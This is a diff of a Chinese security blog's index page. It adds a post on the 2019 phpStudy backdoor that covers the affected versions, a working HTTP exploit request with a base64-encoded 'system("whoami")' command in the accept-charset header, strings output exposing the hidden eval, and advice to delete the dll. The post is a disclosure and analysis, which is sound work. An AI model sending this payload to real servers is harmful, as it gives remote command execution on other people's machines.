@@ -178,6 +178,166 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-phpstudy漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/24/phpstudy漏洞/">phpstudy后门事件</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/24/phpstudy漏洞/" class="archive-article-date">
+  	<time datetime="2019-09-24T04:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="phpstudy后门事件-gt-我的虚拟机中招了-😂"><a href="#phpstudy后门事件-gt-我的虚拟机中招了-😂" class="headerlink" title="phpstudy后门事件   -&gt;  我的虚拟机中招了 😂"></a>phpstudy后门事件   -&gt;  我的虚拟机中招了 😂</h4><p>最近，phpstudy 后门事件搞得风风火火的，然后我检查了自己的笔记本，发现没有中招，本来还高兴于自己的安全意识，因为我下载软件基本从官网下载。结果当我打开我的虚拟机的时候，发现这个版本和我自己用的版本不一致，于是我测试了一下，down，后门存在。虚拟机上也放了一丢丢的敏感文件，这次真的是有点尴尬了，赶紧删除对应版本。不给我平常用的都是7.0，所以问题也不算太大。看来以后下载东西真的要严格把关了。虚拟机上的这个我觉得是虚拟机就随便搞了一个进去，结果就中招了。</p>
+<h4 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h4><p>phpstudy2016-2018，php5.4.45 文件夹下的 php_xmlrpc.dll （我这里的还有php5.4.45 nts 这个文件下的php_xmlrpc.dll是没有后门的）。<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: 192.168.37.10</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line">accept-charset: ZWNobyBzeXN0ZW0oIndob2FtaSIpOw==</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>因为是加载的dll，所以这里随意请求个php文件都可以执行，所以还是很猛的。</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>我这里是phpstudy2018 打开 phpstudy2018\PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll<br>拖入IDA 字符串视图 直接搜索eval即可看到后门</p>
+<p><img src="/images/1569296573066.png" alt="1569296573066"></p>
+<p>如果你没有IDA也很简单，随便找个能看字符串的打开对应 php_xmlrpc.dll 搜索eval，比如linux：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strings php_xmlrpc.dll | grep <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#回显：</span></span><br><span class="line">zend_eval_string</span><br><span class="line">@<span class="built_in">eval</span>(%s(<span class="string">'%s'</span>));</span><br><span class="line">%s;@<span class="built_in">eval</span>(%s(<span class="string">'%s'</span>));</span><br></pre></td></tr></table></figure>
+
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>还想接着用就直接删除 php_xmlrpc.dll  当然最好是去官网下载没有后门的phpstudy。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/24/phpstudy漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-一道php代码审计题目的心路历程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/一道php代码审计题目的心路历程/">一道php代码审计题目的心路历程</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/一道php代码审计题目的心路历程/" class="archive-article-date">
+  	<time datetime="2019-09-10T14:00:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>前端时间做了一道CTF-php代码审计的题目，此题目说难也不算难，属于中等偏上一点点的题目。我在三个小时内做出来了，但是我忽然回顾我做这种代码审计题目的时候，发现这四年的比赛生涯，代码审计题目永远都是我的弱项，而且成长极慢。总是在一头雾水中开始，一头雾水中结束。所以我想梳理一下这道题目我是怎么做出来的，并解决以下问题：<br>1、遇到代码审计的题目从哪里入手才是正确的<br>2、做到哪里是难点，坚持不下去了，这时候应该怎么办<br>3、完全审计清楚，但是仍不会利用怎么办<br>旨在希望自己能真正的理解这些东西。
+        
+          <a class="article-more-a" href="/2019/09/10/一道php代码审计题目的心路历程/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/一道php代码审计题目的心路历程/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-MS-2019_0708复现笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -794,161 +954,6 @@
 
 
   
-    <article id="post-博客搬迁" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/03/博客搬迁/">我的博客再次上线</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/03/博客搬迁/" class="archive-article-date">
-  	<time datetime="2017-08-03T04:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>&#160; &#160; &#160; &#160;第一个博客是大二上学期搭建的，那时候满腔热血，隔几天就要更新一波博客。后来越来越忙，更新越来越少。直到有一天我的服务器和域名都到期了，我觉得没有继续下去的必要了，所以博客下线，我的总结更多的写在了evernote（国际版）上。
-        
-          <a class="article-more-a" href="/2017/08/03/博客搬迁/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/03/博客搬迁/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-深夜十二点" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1997/01/02/深夜十二点/">深夜12点</a>
-    </h1>
-  
-
-        
-        <a href="/1997/01/02/深夜十二点/" class="archive-article-date">
-  	<time datetime="1997-01-01T16:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>1997-01-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>深夜十二点了，</p>
-<p>北京的灯未熄灭</p>
-<p>我在我的出租屋房</p>
-<p>我在我的台灯下写</p>
-        
-          <a class="article-more-a" href="/1997/01/02/深夜十二点/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/1997/01/02/深夜十二点/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1051,19 +1056,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">一些工具</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">app</a>
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">一些工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
